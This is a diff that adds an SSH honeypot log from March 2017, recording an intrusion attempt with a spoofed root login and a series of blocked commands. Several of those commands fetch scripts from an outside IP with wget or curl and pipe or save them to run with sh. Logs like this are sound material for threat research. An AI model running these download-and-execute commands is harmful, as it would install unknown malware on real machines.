@@ -1,0 +1,23 @@
+20170304_133919_819759 - [POT  ] network1 - 192.168.5.2:22
+20170304_133919_819759 - [SSH  ] Incoming Connection from 209.236.43.154:48885 - Jamaica
+20170304_133921_635536 - [SSH  ] Login Successful: root:123
+20170304_133921_635536 - [SSH  ] Login was spoofed
+20170304_133922_413598 - [EXEC44] Opened Channel
+20170304_133922_415259 - [EXEC44] Command Blocked: wget -qO - http://37.187.253.12/x/1sh | sh > /dev/null 2>&1 &
+20170304_133922_423327 - [EXEC44] Closed Channel
+20170304_133922_646994 - [EXEC45] Opened Channel
+20170304_133922_648879 - [EXEC45] Command Blocked: rm -rf /var/run/1sh; wget -c http://37.187.253.12/x/1sh -P /var/run && sh /var/run/1sh &
+20170304_133922_666955 - [EXEC45] Closed Channel
+20170304_133922_877447 - [EXEC46] Opened Channel
+20170304_133922_882861 - [EXEC46] Command Blocked: wget -qO - http://37.187.253.12/x/2sh | sh > /dev/null 2>&1 &
+20170304_133922_891315 - [EXEC46] Closed Channel
+20170304_133923_110261 - [EXEC47] Opened Channel
+20170304_133923_115585 - [EXEC47] Command Blocked: rm -rf /tmp/2sh; wget -c http://37.187.253.12/x/2sh -P /tmp && sh /tmp/2sh &
+20170304_133923_127526 - [EXEC47] Closed Channel
+20170304_133923_316033 - [EXEC48] Opened Channel
+20170304_133923_321459 - [EXEC48] Command Blocked: curl http://37.187.253.12/x/3sh | sh
+20170304_133923_323205 - [EXEC48] Closed Channel
+20170304_133923_528741 - [EXEC49] Opened Channel
+20170304_133923_530822 - [EXEC49] Command Blocked: uname -a || echo - 
+20170304_133923_535873 - [EXEC49] Closed Channel
+20170304_133951_498090 - [SSH  ] Lost Connection with 209.236.43.154
